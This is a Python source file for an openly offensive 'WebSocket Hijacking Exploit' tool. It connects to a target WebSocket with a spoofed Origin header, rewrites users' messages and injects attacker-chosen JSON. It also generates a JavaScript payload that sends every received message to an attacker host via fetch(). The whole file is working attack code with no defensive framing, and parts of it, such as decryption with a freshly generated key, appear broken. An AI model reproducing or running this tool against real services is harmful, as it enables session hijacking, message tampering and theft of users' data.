import asyncio
import argparse
import json
import base64
import os
from urllib.parse import urlparse
from colorama import Fore, init

import websockets
from cryptography.fernet import Fernet

init(autoreset=True)


class WebsocketMitm:
    def __init__(self, target_uri, payloads, spoof_origin=None, custom_js=None):
        self.target = target_uri
        self.spoof_origin = spoof_origin
        self.custom_js = custom_js
        self.payloads = payloads
        self.cipher = Fernet(Fernet.generate_key())
        self.sessions = {}

    async def _inject_custom_js(self, websocket):
        js_payload = f"""
        <script>
            const ws = new WebSocket('{websocket.url}');
            ws.onmessage = (e) => {{
                fetch('https://attacker-server.com/log?data=' + encodeURIComponent(e.data));
            }};
            {self.custom_js or ''}
        </script>
        """
        return js_payload

    async def _generate_handshake_header(self):

        headers = {
            "Origin": self.spoof_origin or urlparse(self.target).netloc,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WebSocketHijacker/1.0",
            "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
            "Connection": "Upgrade",
            "Upgrade": "websocket"
        }
        return headers

    async def _hijack_session(self, websocket):
        """Обработка сообщений с улучшенной обработкой ошибок"""
        async for message in websocket:
            try:
                # Обработка текстовых сообщений
                if isinstance(message, str):
                    data = json.loads(message)
                    print(Fore.CYAN + f"[+] Received: {data}")

                    # Модификация данных
                    if "user" in data:
                        data["user"] = "hijacked_user"

                    modified = json.dumps({**data, **self.payloads})
                    await websocket.send(modified)
                    print(Fore.YELLOW + f"[!] Injected: {modified}")

                # Обработка бинарных сообщений
                else:
                    try:
                        decrypted = self.cipher.decrypt(message)
                        print(Fore.RED + f"[!] Decrypted binary: {decrypted[:50]}...")
                    except:
                        print(Fore.RED + f"[!] Raw binary data: {message[:50]}...")

            except json.JSONDecodeError:
                print(Fore.RED + "[!] Invalid JSON received")
            except Exception as e:
                print(Fore.RED + f"[!] Critical error: {str(e)}")

    async def exploit(self):
        """Улучшенное управление соединением"""
        try:
            async with websockets.connect(
                    self.target,
                    extra_headers=await self._generate_handshake_header(),
                    ping_interval=None,
                    timeout=10
            ) as ws:
                print(Fore.GREEN + "[+] WebSocket connection established")

                if self.custom_js:
                    js = await self._inject_custom_js(ws)
                    print(Fore.BLUE + f"[!] JS Payload:\n{js}")

                await self._hijack_session(ws)

        except websockets.InvalidHandshake:
            print(Fore.RED + "[!] Handshake failed: check headers and URL")
        except ConnectionRefusedError:
            print(Fore.RED + "[!] Connection refused")
        except Exception as e:
            print(Fore.RED + f"[!] Connection error: {str(e)}")


async def main():
    parser = argparse.ArgumentParser(description="WebSocket Hijacking Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target WebSocket URL (ws:// or wss://)")
    parser.add_argument("-o", "--origin", help="Spoofed Origin header")
    parser.add_argument("-p", "--payload", default='{"hijacked":true}', help="JSON payload to inject")
    parser.add_argument("-j", "--javascript", help="Custom malicious JavaScript")
    args = parser.parse_args()

    try:
        payload = json.loads(args.payload)
    except json.JSONDecodeError:
        print(Fore.RED + "[!] Invalid JSON payload")
        return

    attacker = WebsocketMitm(
        target_uri=args.url,
        payloads=payload,
        spoof_origin=args.origin,
        custom_js=args.javascript
    )

    await attacker.exploit()


if __name__ == "__main__":
    asyncio.run(main())
